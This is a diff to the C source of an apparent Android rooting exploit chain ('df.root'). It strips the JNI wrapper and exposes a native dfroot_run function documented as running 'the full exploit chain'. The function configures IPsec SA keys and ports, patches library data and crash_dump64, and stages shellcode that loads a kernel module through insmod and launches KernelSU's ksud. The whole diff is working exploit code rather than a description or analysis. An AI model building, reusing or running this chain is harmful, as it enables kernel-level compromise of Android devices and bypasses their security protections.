@@ -16,21 +16,9 @@
 #include <sys/utsname.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
-#include <jni.h>
 #include "reporter.h"
 #include "aes256.h"
 #include "hmac_sha256.h"
-
-static jmethodID report_mid;
-
-JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved __attribute__((unused))) {
-    JNIEnv *env;
-    (*vm)->GetEnv(vm, (void **)&env, JNI_VERSION_1_4);
-    jclass clz = (*env)->FindClass(env, "df/root/IReporter");
-    report_mid = (*env)->GetMethodID(env, clz, "report", "(Ljava/lang/String;)V");
-    return JNI_VERSION_1_4;
-}
-
 
 struct PatchRestore {
     const char *lib;
@@ -41,16 +29,6 @@ struct PatchRestore {
     uint8_t  tramp_orig[16];
     int      valid;
 };
-
-void reportfmt(struct Reporter *r, const char *fmt, ...) {
-    if (!r) return;
-    va_list va; va_start(va, fmt);
-    char buf[1024]; vsnprintf(buf, sizeof(buf), fmt, va);
-    jstring s = (*r->env)->NewStringUTF(r->env, buf);
-    (*r->env)->CallVoidMethod(r->env, r->obj, report_mid, s);
-    (*r->env)->ExceptionClear(r->env);
-    (*r->env)->DeleteLocalRef(r->env, s);
-}
 
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 static char    *libcxx_ko_target;
@@ -538,51 +516,34 @@ static int createOrphanProcess(struct Reporter *reporter) {
 
 static int has_marker(const char *p) { return access(p, F_OK) == 0; }
 
-JNIEXPORT jint JNICALL
-Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused)),
-                                               jobject reporter_obj,
-                                               jstring koTargetPath,
-                                               jint encapPort, jint spi,
-                                               jbyteArray aesCbcKey,
-                                               jbyteArray hmacKey, jint icvLen,
-                                               jint senderPort,
-                                               jstring packageName,
-                                               jboolean softReboot) {
-    struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;
+/* Run the full exploit chain. SA parameters and the manager package name are
+ * resolved by the caller. Returns 0 on success, 1 when ksud fails, 2 when the
+ * outcome is unknown, 3 when the patches do not land. */
+int dfroot_run(int encap_port, int sender_port, uint32_t spi, int icv_len,
+               const uint8_t aes_key[32], const uint8_t hmac_key[32],
+               const char *ko_target, const char *package_name, int soft_reboot) {
+    struct Reporter ro = {0}, *reporter = &ro;
 
-    g_encap_port  = (int)encapPort;
-    g_sender_port = (int)senderPort;
-    g_spi         = (uint32_t)spi;
+    g_encap_port  = encap_port;
+    g_sender_port = sender_port;
+    g_spi         = spi;
     g_seq         = 1;
-    g_icv_len     = (int)icvLen;
+    g_icv_len     = icv_len;
+    memcpy(g_aes_key, aes_key, 32);
+    memcpy(g_hmac_key, hmac_key, 32);
 
-    jbyte *kb = (*env)->GetByteArrayElements(env, aesCbcKey, NULL);
-    memcpy(g_aes_key, kb, 32);
-    (*env)->ReleaseByteArrayElements(env, aesCbcKey, kb, JNI_ABORT);
-
-    jbyte *hb = (*env)->GetByteArrayElements(env, hmacKey, NULL);
-    memcpy(g_hmac_key, hb, 32);
-    (*env)->ReleaseByteArrayElements(env, hmacKey, hb, JNI_ABORT);
-
-    libcxx_ko_target   = libcxx_data + libcxx_ko_target_off;
-    const char *p = (*env)->GetStringUTFChars(env, koTargetPath, NULL);
-    if (p) {
-        strncpy(libcxx_ko_target, p, 63);
+    libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
+    if (ko_target) {
+        strncpy(libcxx_ko_target, ko_target, 63);
         libcxx_ko_target[63] = '\0';
-        (*env)->ReleaseStringUTFChars(env, koTargetPath, p);
     }
-    libcxx_soft_reboot = (uint8_t *)(libcxx_data + libcxx_soft_reboot_off);
-    *libcxx_soft_reboot = softReboot ? 1 : 0;
-
-    /* The shellcode passes this to insmod, and the LKM runs
-     * `ksud late-load --package-name <name>`, so it has to be the installed manager. */
-    const char *pkg = (*env)->GetStringUTFChars(env, packageName, NULL);
-    if (pkg) {
+    if (package_name) {
         char *pkgval = libcxx_data + libcxx_pkg_val_off;
-        strncpy(pkgval, pkg, 47);
+        strncpy(pkgval, package_name, 47);
         pkgval[47] = '\0';
-        (*env)->ReleaseStringUTFChars(env, packageName, pkg);
     }
+    libcxx_soft_reboot = libcxx_data + libcxx_soft_reboot_off;
+    *libcxx_soft_reboot = soft_reboot ? 1 : 0;
 
     struct PatchRestore libcxx_r = {0};
 
